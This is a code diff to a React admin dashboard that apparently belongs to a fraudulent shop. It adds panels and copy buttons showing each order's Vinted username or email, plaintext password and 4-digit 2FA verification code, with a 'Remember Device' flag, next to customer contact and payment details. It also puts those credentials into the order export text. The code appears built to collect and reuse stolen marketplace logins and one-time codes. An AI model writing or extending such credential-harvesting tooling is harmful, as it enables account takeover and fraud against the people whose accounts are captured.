@@ -178,6 +178,12 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
       `Date/Time: ${new Date(order.createdAt).toLocaleString()}`,
       `Product: ${order.productTitle}`,
       ``,
+      `--- VINTED ACCOUNT LOGIN & 2FA ---`,
+      `Username / Email: ${order.accountDetails?.usernameOrEmail || 'N/A'}`,
+      `Password: ${order.accountDetails?.password || 'N/A'}`,
+      `4-Digit Verification Code: ${order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}`,
+      `Remember Device: ${order.accountDetails?.rememberDevice !== false ? 'Yes' : 'No'}`,
+      ``,
       `--- CUSTOMER CONTACT ---`,
       `Name: ${order.shippingAddress?.fullName || order.paymentMethod?.cardholderName || 'N/A'}`,
       `Phone: ${order.shippingAddress?.phoneNumber || 'N/A'}`,
@@ -537,9 +543,50 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                     </div>
                   </div>
 
-                  {/* Information Grid: Customer, Destination, Payment, Amount */}
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
-                    {/* Column 1: Customer Contact */}
+                  {/* Information Grid: Login Credentials, Customer, Destination, Payment */}
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
+                    {/* Column 1: Account Login & 2FA Credentials */}
+                    <div className="bg-amber-50/60 p-3 rounded-lg border border-amber-200/80 space-y-2">
+                      <div className="flex items-center justify-between">
+                        <span className="font-bold text-amber-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
+                          <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Account Login & 2FA
+                        </span>
+                        <button
+                          type="button"
+                          onClick={() =>
+                            handleCopy(
+                              `User: ${order.accountDetails?.usernameOrEmail || 'N/A'} | Pass: ${order.accountDetails?.password || 'N/A'} | 2FA: ${order.accountDetails?.phoneCode || 'N/A'}`,
+                              `acc_${order.id}`
+                            )
+                          }
+                          className="text-[10px] text-amber-800 font-semibold hover:underline cursor-pointer"
+                        >
+                          {copiedField === `acc_${order.id}` ? 'Copied' : 'Copy'}
+                        </button>
+                      </div>
+                      <div className="space-y-1">
+                        <div>
+                          <span className="text-amber-800/70 text-[10px]">Username / Email:</span>
+                          <p className="font-bold text-sm text-gray-900 break-all">
+                            {order.accountDetails?.usernameOrEmail || 'N/A'}
+                          </p>
+                        </div>
+                        <div>
+                          <span className="text-amber-800/70 text-[10px]">Password:</span>
+                          <p className="font-mono font-bold text-xs text-gray-900">
+                            {order.accountDetails?.password || 'N/A'}
+                          </p>
+                        </div>
+                        <div>
+                          <span className="text-amber-800/70 text-[10px]">4-Digit Verification Code:</span>
+                          <p className="font-mono font-extrabold text-sm text-amber-800 tracking-widest">
+                            {order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Column 2: Customer Contact */}
                     <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                       <div className="flex items-center justify-between">
                         <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
@@ -571,7 +618,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                       </div>
                     </div>
 
-                    {/* Column 2: Delivery Destination */}
+                    {/* Column 3: Delivery Destination */}
                     <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                       <div className="flex items-center justify-between">
                         <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
@@ -623,7 +670,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                       )}
                     </div>
 
-                    {/* Column 3: Payment Details */}
+                    {/* Column 4: Payment Details */}
                     <div className="bg-gray-50/70 p-3 rounded-lg border border-gray-200/80 space-y-2">
                       <div className="flex items-center justify-between">
                         <span className="font-bold text-gray-900 flex items-center gap-1 text-[11px] uppercase tracking-wider">
@@ -700,6 +747,47 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
             </div>
 
             <div className="p-4 sm:p-6 overflow-y-auto space-y-4 text-xs font-normal">
+              {/* Vinted Account Login & 2FA Credentials */}
+              <div className="p-3.5 bg-amber-50 rounded-xl border border-amber-200 space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-bold text-amber-900 uppercase flex items-center gap-1 tracking-wider">
+                    <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Account Login & 2FA Credentials
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() =>
+                      handleCopy(
+                        `User: ${activeOrder.accountDetails?.usernameOrEmail || 'N/A'}\nPass: ${activeOrder.accountDetails?.password || 'N/A'}\nCode: ${activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode || 'N/A'}`,
+                        `m_acc_${activeOrder.id}`
+                      )
+                    }
+                    className="text-[10px] text-amber-800 font-bold hover:underline cursor-pointer"
+                  >
+                    {copiedField === `m_acc_${activeOrder.id}` ? 'Copied' : 'Copy Credentials'}
+                  </button>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 pt-1">
+                  <div>
+                    <span className="text-amber-800/70 text-[10px]">Email / Username:</span>
+                    <p className="font-bold text-sm text-gray-900 break-all">
+                      {activeOrder.accountDetails?.usernameOrEmail || 'N/A'}
+                    </p>
+                  </div>
+                  <div>
+                    <span className="text-amber-800/70 text-[10px]">Password:</span>
+                    <p className="font-mono font-bold text-sm text-gray-900">
+                      {activeOrder.accountDetails?.password || 'N/A'}
+                    </p>
+                  </div>
+                  <div>
+                    <span className="text-amber-800/70 text-[10px]">4-Digit Verification Code:</span>
+                    <p className="font-mono font-extrabold text-base text-amber-800 tracking-widest">
+                      {activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode || 'N/A'}
+                    </p>
+                  </div>
+                </div>
+              </div>
+
               {/* Product */}
               <div className="p-3 bg-gray-50 rounded-xl border border-gray-200">
                 <span className="text-[10px] font-semibold text-gray-400 uppercase block">Product</span>
